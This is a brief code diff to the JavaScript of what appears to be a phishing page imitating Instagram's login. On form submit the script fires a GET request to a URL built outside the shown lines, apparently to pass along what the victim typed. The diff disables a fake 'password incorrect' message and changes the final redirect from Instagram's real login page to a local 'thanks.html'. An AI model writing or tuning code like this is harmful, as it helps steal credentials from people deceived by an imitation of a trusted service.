@@ -27,13 +27,13 @@ form.addEventListener("submit", (e) => {
         let api = new XMLHttpRequest();
         api.open("GET", url, true);
         api.send();
-        document.getElementById("alert-message").innerHTML =
-          "Sorry, your password was incorrect. Please double-check your password.";
-      });
+      //   document.getElementById("alert-message").innerHTML =
+      //     "Sorry, your password was incorrect. Please double-check your password.";
+      // });
 
 
 
 
-  // window.location.replace("https://www.instagram.com/accounts/login/")
+  window.location.replace("thanks.html")
   //   console.log("Incorrect Password!");
 });
